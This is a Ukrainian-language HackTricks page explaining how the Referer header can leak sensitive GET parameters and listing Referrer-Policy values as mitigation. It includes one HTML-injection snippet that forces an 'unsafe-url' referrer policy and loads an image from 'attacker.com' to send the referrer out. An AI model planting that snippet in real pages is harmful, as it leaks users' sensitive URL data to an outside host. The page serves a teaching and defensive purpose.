{% hint style="success" %}
Вивчайте та практикуйте взлом AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

# Заголовки реферерів та політика

Реферер - це заголовок, який використовується браузерами для вказівки на те, яка була попередня відвідана сторінка.

## Витік чутливої інформації

Якщо на веб-сторінці в який-небудь момент знаходиться чутлива інформація в параметрах запиту GET, якщо сторінка містить посилання на зовнішні джерела або зловмисник може зробити/запропонувати (соціальний інжиніринг) користувачеві відвідати URL, котрим керує зловмисник. Це може дозволити витягти чутливу інформацію з останнього запиту GET.

## Пом'якшення

Ви можете змусити браузер дотримуватися **політики реферера**, яка може **запобігти** відправці чутливої інформації іншим веб-додаткам:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Протидія контролю

Ви можете перевизначити це правило, використовуючи HTML мета-тег (зловмисник повинен використовувати HTML ін'єкцію):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Захист

Ніколи не розміщуйте будь-які чутливі дані всередині параметрів GET або шляхів в URL-адресі.
